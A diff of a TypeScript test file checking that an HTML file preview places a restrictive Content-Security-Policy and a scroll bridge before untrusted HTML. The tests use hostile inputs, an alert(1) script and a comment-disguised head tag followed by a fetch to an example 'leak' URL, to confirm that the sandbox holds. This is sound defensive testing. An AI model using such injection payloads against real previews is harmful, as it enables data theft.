@@ -3,7 +3,7 @@ import assert from "node:assert/strict";
 import { createHash } from "node:crypto";
 import { htmlPreviewSource, inlinePreviewStyles } from "../src/web/components/FileWorkspace.tsx";
 
-test("HTML preview injects a restrictive CSP into an existing head", () => {
+test("HTML preview prefixes a restrictive CSP before an existing head", () => {
   const source = htmlPreviewSource("<!doctype html><html><head><title>x</title></head><body>ok</body></html>");
   assert.match(source, /Content-Security-Policy/);
   assert.match(source, /default-src 'none'/);
@@ -19,10 +19,17 @@ test("HTML preview injects a restrictive CSP into an existing head", () => {
 
 test("HTML fragments stay opaque and authorize only the scroll bridge", () => {
   const source = htmlPreviewSource("<h1>Hello</h1><script>alert(1)</script>");
-  assert.match(source, /^<!doctype html><html><head>/);
+  assert.match(source, /^<!doctype html><meta http-equiv="Content-Security-Policy"/);
   assert.doesNotMatch(source, /allow-same-origin/);
   assert.match(source, /event\.source===parent/);
   assert.match(source, /mission:file-preview-scroll/);
+});
+
+test("a head-looking comment cannot swallow the preview CSP or scroll bridge", () => {
+  const hostile = '<!-- <head> --><script>fetch("https://example.com/leak")</script>';
+  const source = htmlPreviewSource(hostile);
+  assert.ok(source.indexOf("Content-Security-Policy") < source.indexOf(hostile));
+  assert.ok(source.indexOf("mission:file-preview-scroll") < source.indexOf(hostile));
 });
 
 test("checkout-local stylesheets are inlined without weakening the preview CSP", async () => {
